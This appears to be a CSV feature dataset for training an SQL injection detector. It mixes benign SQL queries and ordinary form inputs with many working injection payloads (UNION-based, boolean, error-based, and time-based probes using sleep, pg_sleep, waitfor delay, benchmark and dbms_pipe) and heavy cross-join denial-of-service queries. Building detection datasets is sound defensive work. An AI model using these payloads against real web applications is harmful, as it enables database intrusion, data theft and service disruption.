,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
16934,ticona,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
27913,select min ( pay )  as unhappy from driving,0,0,2,0,0,8,0,0,0,0,0,32,0,0,1,3.7612001156935615,5.022400427811018
6285,"1""  )   where 4849  =  4849 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,1,15,1,0,21,0,1,3,0,0,36,21,0,2,4.762173934797756,6.896968201498669
10130,"iif  (  1217  =  8831,1,1/0  )  ",0,0,6,0,0,6,0,0,1,0,0,3,11,0,0,3.4657359027997265,4.519779854678687
26727,select * from flight 3,0,0,1,0,0,4,0,0,1,0,0,16,1,0,1,3.091042453358316,3.9129887722739327
23526,select pitch ( s ) from several inner join,0,0,2,0,0,8,0,0,0,0,0,32,0,0,2,3.737669618283368,4.981567234930947
9328,"1%""   )    )     )   union all select null--",0,1,7,1,0,7,1,0,2,1,0,18,1,1,1,3.784189633918261,5.062431490914847
29791,select avg ( court ) from yourself select sum ( success ) ,0,0,4,0,0,12,0,0,0,0,0,42,0,0,4,4.060443010546419,5.554195840989334
2287,"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",0,4,16,0,0,22,0,2,0,0,0,35,10,0,1,4.787491742782046,6.948051004895869
17898,39699852n,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
6394,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",1,0,23,0,0,25,0,4,0,0,0,37,16,4,0,4.836281906951478,7.047030967710781
8969,"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",4,0,15,0,0,15,2,2,0,0,0,9,13,0,0,4.343805421853684,6.0797984693327525
27029,select min ( hot )  as sum from shoe,0,0,2,0,0,8,0,0,0,0,0,25,0,0,2,3.58351893845611,4.717530264472627
7879,"1' in boolean mode  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  #",1,0,30,0,0,39,0,4,0,1,0,65,24,6,0,5.278114659230517,7.976447065254482
4323,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,0,0,11,1,0,18,0,0,3,0,0,34,2,0,2,4.465908118654584,6.313121924766899
27869,select smaller from please union all select weather from pattern order by course,0,0,0,0,0,12,0,0,0,0,0,68,0,0,3,4.382026634673881,6.152384767567401
14235,97,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0.6931471805599453,0.7296931454567191
6166,select   (  case when   (  5914  =  2314  )   then 5914 else 1/  (  select 0  )   end  )  --,0,0,10,1,0,19,0,0,3,0,0,31,14,0,2,4.5217885770490405,6.42130769614405
14712,"fivasa, 15,",0,0,2,0,0,1,0,0,0,0,0,6,2,0,0,2.3978952727983707,2.8749024412290907
17032,25480,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
28578,select * from frighten where not figure = 'list'  and not apart = 'heavy',4,0,7,0,0,13,0,2,1,0,0,52,0,0,1,4.290459441148391,5.97916802637938
17115,gavald,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
18327,nalbach0@softwaremasservicio.aero,0,0,2,0,0,0,0,0,0,0,0,30,1,0,0,3.49650756146648,4.571113592379885
28071,select smile,0,0,0,0,0,1,0,0,0,0,0,11,0,0,1,2.4849066497880004,2.999482870035824
4778,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",0,0,12,0,0,20,0,1,1,0,0,64,8,0,2,4.77912349311153,6.9311456575691
8224,-4775'  )   or 3038  =  3038,1,0,4,0,0,5,0,1,1,0,0,2,12,0,0,3.332204510175204,4.299691526222142
9167,1'  )   where 7903  =  7903,1,0,3,0,0,5,0,0,0,0,0,5,9,0,0,3.295836866004329,4.240494654101009
19467,select option_value from wp_options where option_name  =  'options_footer_button_4_text' limit 1,2,0,10,0,0,9,0,0,0,0,0,73,2,0,1,4.564348191467836,6.504302289710709
7286,"1   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003",0,0,17,0,0,34,0,2,1,0,0,111,20,0,2,5.3612921657094255,8.158268106249867
4703,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""afby""  =  ""afby",0,4,15,0,0,18,0,2,0,0,0,22,10,0,0,4.574710978503383,6.524589271310591
23047,select road ( s )  from middle select rice from broke,0,0,2,0,0,10,0,0,0,0,0,40,0,0,2,3.970291913552122,5.391515666300752
8935,"1""  )   as jngl where 8384  =  8384 and 4580  =  1718--",0,1,6,1,0,11,0,1,2,0,0,14,17,0,0,4.007333185232471,5.458096843121287
22802,select top 3 * from halfway select * from slide 3select * from desk,0,0,3,0,0,13,0,0,3,0,0,49,2,0,3,4.204692619390966,5.819025031871101
27921,select top 3 * from ill where store = 'sister' select * from feet,2,0,5,0,0,13,0,0,2,0,0,46,1,0,3,4.174387269895637,5.762920220853171
17924,nodonk@locuraporno.ar,0,0,2,0,0,0,0,0,0,0,0,19,0,0,0,3.044522437723423,3.839958531231341
2965,1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,4,0,75,0,0,94,0,15,0,0,0,112,51,13,2,6.089044875446846,9.84759353286679
17749,95001516q,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
17014,oretana,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
19096,nickolau,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
18683,23291292c,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
18125,nikolia,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
7788,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1,0,17,0,0,21,0,1,0,0,1,36,35,0,1,4.934473933130692,7.248396945100476
23288,select * from arrangement where port = 'grandfather' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,59,1,0,3,4.330733340286331,6.055066595411042
34," select * from users where id  =  '1' union select +\.,@@version -- 1'",3,0,12,1,0,13,0,0,4,0,0,40,2,0,2,4.248495242049359,5.900560584269694
13630,7.80e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
16254,43751883h,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
1284,"1"" where 8727  =  8727",0,1,2,0,0,4,0,0,0,0,0,5,9,0,0,3.091042453358316,3.9129887722739327
7861,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",2,3,17,0,0,18,0,1,1,0,0,46,10,0,1,4.787491742782046,6.948051004895869
15019,lavat@ajuntamentbarcelona20.gy,0,0,2,0,0,0,0,0,0,0,0,26,2,0,0,3.4011973816621555,4.412867051146341
25264,select * from dog where replied = 'golden' limit 3,2,0,4,0,0,9,0,0,1,0,0,36,1,0,1,3.912023005428146,5.287509109454676
27801, update suit set nearer = 'share'where decide = 'forth',4,0,6,0,0,9,0,0,0,0,0,40,0,0,0,4.007333185232471,5.458096843121287
12897,tardguila,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
28619,select count ( made ) from promised,0,0,2,0,0,6,0,0,0,0,0,27,0,0,2,3.555348061489413,4.669921102482963
28336,"select * from operation where stick between ""generally"" and    ""promised""",0,4,5,0,0,9,0,1,1,0,0,56,0,0,1,4.290459441148391,5.97916802637938
6374,"1   )    )    as aqpy where 4027  =  4027 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,0,16,1,0,27,0,1,3,0,0,82,16,0,2,5.093750200806762,7.581275718599696
513," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@version -- 1",0,0,12,1,0,19,0,1,4,0,0,42,4,0,2,4.465908118654584,6.313121924766899
23834,select heard from single union all select vapor from tail order by solution,0,0,0,0,0,12,0,0,0,0,0,63,0,0,3,4.31748811353631,6.030055566276218
3925,"-3347%"" or 9323  =  9323#",0,1,5,0,0,4,1,1,1,0,0,2,12,0,0,3.218875824868201,4.116261188933881
7658,"1 union all select null,null--",0,0,3,1,0,4,0,0,2,2,0,22,1,2,1,3.4011973816621555,4.412867051146341
8394,"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  # aetd",0,0,31,0,0,57,0,1,2,0,0,103,55,0,7,5.6937321388027,8.907574619526374
17352,pardos@barcafedaniss.co,0,0,2,0,0,0,0,0,0,0,0,21,0,0,0,3.1354942159291497,3.983240309714999
17641,llovet,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
4521,1  )   as dlkh where 6179  =  6179 and 9198  =  9198--,0,0,5,1,0,11,0,1,2,0,0,14,17,0,0,3.9889840465642745,5.42506920217274
7629,"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",1,0,10,0,0,4,0,0,1,0,0,14,36,0,1,4.158883083359672,5.734313559436426
18579,losar de la vera,0,0,0,0,0,3,0,0,0,0,0,13,0,0,0,2.772588722239781,3.4229084603450888
26982,select silence from caught union select upward from except order by one,0,0,0,0,0,11,0,0,0,0,0,60,0,0,3,4.262679877041316,5.927077040928176
27823,select top 3 * from food where begun = 'careful' select * from milk,2,0,5,0,0,13,0,0,2,0,0,48,1,0,3,4.204692619390966,5.819025031871101
15917,6.88e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
9087,"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'hpbt'  =  'hpbt",4,0,24,0,0,25,0,2,1,0,0,74,10,0,2,5.099866427824199,7.594214353263836
15719,"calle castellet 94,",0,0,1,0,0,2,0,0,0,0,0,14,2,0,0,2.9444389791664403,3.684523708911846
27032,select * from laugh 3 select * from means,0,0,2,0,0,8,0,0,2,0,0,30,1,0,2,3.713572066704308,4.939896154656966
30451,delete from win,0,0,0,0,0,2,0,0,0,0,0,13,0,0,0,2.70805020110221,3.326353218260614
26386,select pour ( s )  from political full outer join,0,0,2,0,0,9,0,0,0,0,0,37,0,0,2,3.8918202981106265,5.251655965920898
27826,select avg ( rubbed ) from original,0,0,2,0,0,6,0,0,0,0,0,27,0,0,2,3.555348061489413,4.669921102482963
25027,from  ( select distinct raise from spring ) ,0,0,2,0,0,8,0,0,0,0,0,33,0,0,1,3.784189633918261,5.062431490914847
28254,select rose ( s from own right join,0,0,1,0,0,7,0,0,0,0,0,27,0,0,2,3.555348061489413,4.669921102482963
18456,"calle santander, 0,",0,0,2,0,0,2,0,0,0,0,0,14,1,0,0,2.9444389791664403,3.684523708911846
19172,select option_value from wp_options where option_name  =  'wpassetcleanup_settings' limit 1,2,0,7,0,0,9,0,0,0,0,0,72,1,0,1,4.51085950651685,6.400078810527845
6135,"1%'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",4,0,22,0,0,26,2,2,1,0,0,68,8,0,2,5.043425116919247,7.4752555247670145
9442,"-3775'  )   as rqet where 7092  =  7092 or elt  (  1032  =  1032,3623  )  --",1,0,10,1,0,15,0,1,3,0,0,16,24,0,0,4.330733340286331,6.055066595411042
21033,select avg ( moon ) from saw select sum ( concerned ) ,0,0,4,0,0,12,0,0,0,0,0,38,0,0,4,3.9889840465642745,5.42506920217274
17074,shihhai0,0,0,0,0,0,0,0,0,0,0,0,7,1,0,0,2.079441541679836,2.432300417938136
8424,-2715'   )    )    or 6942  =  1636 and    (    (   'mqeq'  =  'mqeq,4,0,11,0,0,12,0,2,1,0,0,13,12,0,0,4.219507705176107,5.846543550882007
3111,waitfor delay '0:0:5' and    (    (   7619  =  7619,2,0,7,0,0,8,0,1,0,0,0,15,11,0,0,3.9318256327243257,5.322755734775789
5374,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   8535  =  8535",0,0,11,0,0,18,0,1,1,0,0,65,11,0,2,4.787491742782046,6.948051004895869
6577,"-1908""  )   where 6420  =  6420 union all select 6420,6420,6420,6420--",0,1,9,1,0,9,0,0,3,0,0,19,28,0,1,4.248495242049359,5.900560584269694
21215,select top 3 * from copy where out = 'cheese',2,0,4,0,0,9,0,0,1,0,0,31,1,0,2,3.80666248977032,5.101693885125393
23100,select top 50 percent * from glass select * from camp fetch first 50 percent rows onlyselect top 3 * from sleep,0,0,3,0,0,21,0,0,3,0,0,82,5,0,6,4.709530201312334,6.791357624410744
21811,select min ( swim )  as evening from breathe,0,0,2,0,0,8,0,0,0,0,0,33,0,0,1,3.784189633918261,5.062431490914847
11477,olaya,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
29290,select min ( liquid )  as wide from day,0,0,2,0,0,8,0,0,0,0,0,28,0,0,1,3.6635616461296463,4.853884482035236
30206,"  select roseid as id, nine as opposite from middle",0,0,1,0,0,9,0,0,0,0,0,40,0,0,1,3.9318256327243257,5.322755734775789
24981,select * from block where organization not like 'picture%',2,0,4,0,0,8,1,1,1,0,0,46,0,0,1,4.060443010546419,5.554195840989334
4296,1   )    )    as cwyb where 3633  =  3633,0,0,3,0,0,8,0,0,0,0,0,11,9,0,0,3.713572066704308,4.939896154656966
1914,"-5661'   )    )    union all select 3011,3011#",1,0,6,0,0,6,0,0,1,0,0,14,12,0,1,3.828641396489095,5.140218969441503
1428,"-6747"" or 9323  =  9323#",0,1,4,0,0,4,0,1,1,0,0,2,12,0,0,3.1780538303479458,4.05093304771096
30529,select * from better where gave = 'slipped',2,0,4,0,0,7,0,0,1,0,0,32,0,0,1,3.7612001156935615,5.022400427811018
16242,33814848h,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
13605,pipponzi,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
7421,1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,0,0,11,1,0,26,0,0,2,0,1,42,21,0,1,4.836281906951478,7.047030967710781
23448,select tears from gain,0,0,0,0,0,3,0,0,0,0,0,19,0,0,1,3.091042453358316,3.9129887722739327
27368,"  select orders.obtainrid, employees.curious, employees.nodded from ordersright join employees on orders.employeeid  =  employees.dieid order by orders.sickid",0,0,9,0,0,15,0,0,0,0,0,131,0,0,3,5.062595033026967,7.515548459825613
27348,select * from area where price not between 10 and 20,0,0,1,0,0,10,0,2,1,0,0,37,4,0,1,3.951243718581428,5.357417698153898
15700,2169,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
23648,from  ( select distinct include from high ) ,0,0,2,0,0,8,0,0,0,0,0,33,0,0,1,3.784189633918261,5.062431490914847
6161,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",0,1,12,1,0,16,0,1,2,0,0,19,10,0,1,4.406719247264253,6.199496085735905
24268,select top 50 percent * from anything,0,0,1,0,0,6,0,0,1,0,0,28,2,0,2,3.610917912644224,4.764024421755989
23837,"   select employees.aside, count ( orders.governmentid )  as thickfrom    ( ordersinner join cheese on orders.steadyid  =  employees.happenedid ) ",0,0,10,0,0,18,0,0,0,0,0,110,0,0,3,4.983606621708336,7.350251518992875
22487,"   select report, rod, shownfrom speech where bell  is not null",0,0,2,0,0,10,0,1,0,1,0,48,0,1,1,4.143134726391533,5.7053230539652695
3216,"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'nvsy' like 'nvsy",4,0,23,0,0,25,0,2,1,0,0,78,10,0,2,5.10594547390058,7.607085866005653
11125,"-8347%'  )   union all select 7643,7643,7643--",1,0,8,1,0,5,1,0,3,0,0,14,16,0,1,3.828641396489095,5.140218969441503
11884,19784273h,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
24295,"  select * from program where clearly in  ( 'dead', 'thirty', 'engineer' )  ",6,0,11,0,0,13,0,0,1,0,0,49,0,0,1,4.330733340286331,6.055066595411042
6696,"1""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,1,17,1,0,29,0,1,3,0,0,108,12,0,2,5.225746673713202,7.863109066817221
14659,vartan,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
18465,4.30e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
26194,select cut ( s )  from copper select distant from cost,0,0,2,0,0,10,0,0,0,0,0,41,0,0,2,3.9889840465642745,5.42506920217274
26020,select * from my where not of = 'minerals'  and not people = 'reader',4,0,7,0,0,13,0,2,1,0,0,48,0,0,1,4.23410650459726,5.873719016140452
23863,"   select supper, finger, entirefrom slope where here  is not null",0,0,2,0,0,10,0,1,0,1,0,51,0,1,1,4.189654742026425,5.791153910047609
22568,from  ( select distinct bark from older ) ,0,0,2,0,0,8,0,0,0,0,0,31,0,0,1,3.737669618283368,4.981567234930947
741, union all select,0,0,0,0,0,3,0,0,0,0,0,14,0,0,1,2.833213344056216,3.514446415767603
8961,1' in boolean mode  )   and 9198  =  9198--,1,0,5,1,0,8,0,1,2,0,0,16,9,0,0,3.7612001156935615,5.022400427811018
30655,select * from problem where movie = 'add' limit 3,2,0,4,0,0,9,0,0,1,0,0,35,1,0,1,3.8918202981106265,5.251655965920898
4964,"-9208%""   )    )    or 8571  =  8571--",0,1,8,1,0,6,1,1,3,0,0,2,12,0,0,3.6375861597263857,4.809458789423759
7542,"select benchmark  (  5000000,md5  (  0x714e4153   )    )   #",0,0,6,0,0,8,0,0,0,0,1,19,16,0,1,4.0943445622221,5.615932130190505
20938,select count ( plates ) from needed,0,0,2,0,0,6,0,0,0,0,0,27,0,0,2,3.555348061489413,4.669921102482963
8357,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'juhi' like 'juhi",3,0,18,0,0,18,0,1,1,0,0,75,5,0,2,4.882801922586371,7.142068971399032
1865,-7209'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  ,1,0,42,0,0,54,0,7,1,0,0,53,36,6,1,5.541263545158426,8.559367492058051
12499,mantencin,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
11587,paucides,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
2771,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",5,0,17,0,0,17,1,1,1,0,0,38,10,0,1,4.68213122712422,6.736714051207547
20281,select student from wore union select sang from pour order by habit,0,0,0,0,0,11,0,0,0,0,0,56,0,0,3,4.204692619390966,5.819025031871101
29883,select top 3 * from perhaps where coming = 'telephone' select * from nearest,2,0,5,0,0,13,0,0,2,0,0,57,1,0,3,4.330733340286331,6.055066595411042
23015,select * from younger where could like '%chart%',2,0,5,0,0,7,2,0,1,0,0,36,0,1,1,3.871201010907891,5.215173163969822
1967,"1"" rlike   (  select   (  case when   (  5552  =  1712  )   then 1 else 0x28 end   )    )   ",0,1,8,0,0,19,0,0,0,0,1,31,13,0,1,4.5217885770490405,6.42130769614405
20427,select min ( wood )  as union from disease,0,0,2,0,0,8,0,0,0,0,0,31,0,0,1,3.737669618283368,4.981567234930947
11967,90660924f,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
7426,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",0,1,14,1,0,7,1,0,2,8,0,46,1,8,1,4.3694478524670215,6.128451232979604
26462,select * from becoming where hunter in  ( select thin from guess ) ,0,0,3,0,0,13,0,0,1,0,0,50,0,0,2,4.204692619390966,5.819025031871101
23942,select count ( distinct society )  from paint,0,0,2,0,0,7,0,0,0,0,0,35,0,0,2,3.80666248977032,5.101693885125393
24605,"  select signid as id, grain as throat from riding",0,0,1,0,0,9,0,0,0,0,0,39,0,0,1,3.912023005428146,5.287509109454676
23554,select * from frozen where fog = 'raw'  and city = 'soap',4,0,7,0,0,11,0,1,1,0,0,38,0,0,1,4.04305126783455,5.522643883333643
11658,18898337l,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
18838,78267819s,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
14466,25559456q,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
10158,1'+  (  select 'tmel' where 2655  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else 0x28 end   )    )     )  +',4,0,16,0,0,27,0,0,2,0,1,46,21,0,2,4.927253685157205,7.2334909053693135
4131,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",1,0,10,0,0,4,0,0,1,0,0,14,36,0,1,4.158883083359672,5.734313559436426
9252,select   (  case when   (  2576  =  7563  )   then 2576 else 1/  (  select 0  )   end  )  --,0,0,10,1,0,19,0,0,3,0,0,31,14,0,2,4.5217885770490405,6.42130769614405
3271,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",0,0,26,1,0,27,0,4,2,0,0,36,16,4,0,4.927253685157205,7.2334909053693135
26623,delete from cookies where parallel = 'correctly',2,0,3,0,0,6,0,0,0,0,0,39,0,0,0,3.871201010907891,5.215173163969822
